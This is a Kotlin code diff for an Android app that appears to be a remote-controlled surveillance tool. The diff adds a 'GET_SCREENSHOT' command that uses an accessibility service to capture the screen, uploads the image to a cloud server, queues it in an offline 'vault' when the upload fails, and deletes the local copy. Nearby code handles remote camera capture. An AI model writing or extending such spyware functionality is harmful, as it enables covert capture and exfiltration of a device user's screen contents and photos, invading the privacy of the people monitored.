@@ -346,6 +346,33 @@ object CommandProcessor {
                         ctx.startService(i)
                     }
                 }
+                "GET_SCREENSHOT" -> {
+                    if (MyAccessibilityService.instance == null) {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility service is required for screenshots."
+                    } else {
+                        val quality = content.trim().toIntOrNull() ?: 70
+                        val deferredFile = CompletableDeferred<java.io.File?>()
+                        
+                        MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
+                            deferredFile.complete(file)
+                        }
+
+                        val file = withTimeoutOrNull(10000) { deferredFile.await() }
+                        if (file != null) {
+                            if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
+                                status = "SCREENSHOT_UPLOADED"
+                                file.delete()
+                            } else {
+                                DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
+                                status = "SCREENSHOT_QUEUED_OFFLINE"
+                            }
+                        } else {
+                            status = "SCREENSHOT_FAILED"
+                            errorMsg = "Capture timed out or device version incompatible."
+                        }
+                    }
+                }
                 "CAPTURE_IMAGE" -> {
                     val parts = content.split("|")
                     val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
